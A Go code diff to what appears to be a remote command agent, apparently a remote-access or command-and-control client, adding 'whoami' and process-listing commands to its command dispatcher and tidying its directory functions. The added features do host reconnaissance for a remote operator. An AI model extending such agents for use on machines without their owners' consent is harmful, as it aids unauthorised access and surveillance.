@@ -6,11 +6,15 @@ import (
 	"crypto/md5"
 	"encoding/gob"
 	"encoding/hex"
+	"fmt"
 	"io/ioutil"
 	"log"
 	"net"
 	"os"
+	"os/user"
 	"time"
+
+	ps "github.com/mitchellh/go-ps"
 )
 
 var (
@@ -74,11 +78,31 @@ func executeCommand(command string) (response string) {
 		if len(separatedCommand[1]) > 0 {
 			response = changeDir(separatedCommand[1])
 		}
+	case "whoami":
+		response = whoAmI()
+	case "ps":
+		response = listProcesses()
 	default:
 		//
 	}
 
 	return response
+}
+
+// $ go get github.com/mitchellh/go-ps
+func listProcesses() (processes string) {
+	processList, _ := ps.Processes()
+	for _, process := range processList {
+		// 2050 -> 2051 -> /usr/bin/gnome-terminal
+		processes += fmt.Sprintf("%d -> %d -> %s\n", process.PPid(), process.Pid(), process.Executable())
+	}
+	return processes
+}
+
+func whoAmI() (myName string) {
+	user, _ := user.Current()
+	myName = user.Username
+	return myName
 }
 
 func changeDir(newDir string) (response string) {
@@ -90,13 +114,13 @@ func changeDir(newDir string) (response string) {
 	return response
 }
 
-func listActualDir() string {
-	message.AgentCWD, _ = os.Getwd()
-	return message.AgentCWD
+func listActualDir() (actualDir string) {
+	actualDir, _ = os.Getwd()
+	return actualDir
 }
 
 func listFiles() (response string) {
-	files, _ := ioutil.ReadDir(message.AgentCWD)
+	files, _ := ioutil.ReadDir(listActualDir())
 	for _, file := range files {
 		response += file.Name() + "\n"
 	}
